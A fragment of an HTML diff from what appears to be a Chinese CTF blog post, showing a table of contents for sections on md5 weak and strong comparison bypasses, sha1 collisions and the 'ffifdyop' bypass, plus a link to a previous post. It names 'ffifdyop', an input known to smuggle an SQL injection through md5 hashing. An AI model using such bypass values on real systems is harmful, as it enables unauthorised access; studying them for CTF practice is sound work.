+        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#md5%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E-sha1%E7%A2%B0%E6%92%9E"><span class="toc-number">1.</span> <span class="toc-text">md5强弱碰撞+sha1碰撞</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#md5%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-number">1.1.</span> <span class="toc-text">md5弱比较</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#md5%E5%BC%BA%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">md5强类型绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E9%80%9A%E5%BC%8Fffifdyop-%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">万能通式ffifdyop 绕过</span></a></li></ol></li></ol>
       </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2025/07/07/pop/">pop</a>
+            </p>
+           
+          
+        </div>
       
     </div>
   </div>
